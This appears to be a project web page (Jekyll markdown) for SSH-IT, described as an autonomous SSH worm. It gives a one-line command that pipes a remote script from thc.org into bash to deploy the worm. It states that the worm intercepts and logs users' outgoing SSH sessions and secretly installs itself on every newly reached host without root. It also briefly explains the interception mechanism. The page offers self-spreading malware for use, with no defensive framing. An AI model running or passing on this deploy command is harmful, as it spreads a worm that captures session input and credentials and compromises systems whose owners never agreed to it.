---
layout: default
title: SSH-IT
description: An autonomous SSH worm that intercepts outgoing SSH connections every time a user uses ssh.
---

<!-- Begin of ugly CSS navigation styling hack -->
<!-- <style>a[href="/ssh-it/"] { font-weight: bold; }</style> -->
<!-- End of ugly CSS navigation styling hack -->

{% include nav-ssh-it-v1.html margin-top="0" margin-bottom="4rem" %}

<div style="width:80%; margin:auto">
    <script id="asciicast-LNmtdthAM1WewOs12ZnHd8RyC" src="https://asciinema.org/a/LNmtdthAM1WewOs12ZnHd8RyC.js" async data-autoplay=1 data-speed="1.5"></script>
</div>

## Install / Deploy

SSH-IT can be installed and deployed with a [single command](deploy):

```shell
bash -c "$(curl -fsSL https://thc.org/ssh-it/x)"
```

[Read more](deploy) and learn some [tricks](deploy).

## What it does

SSH-IT intercepts outgoing SSH connections every time a user uses `ssh`. It logs the session and (secretly) installs itself onto the newly connected system. SSH-IT keeps intercepting, logging and spreading.

## How it works

SSH-IT executes the original ssh command inside a fake PTY harness and intercepts any user input and output. None of the system binaries are modified and it does not need `ptrace()`. It does not require root or superuser privileges.

Read our [detailed explanation](how-it-works) for more information.

## Contact

{% include contact-details.md %}

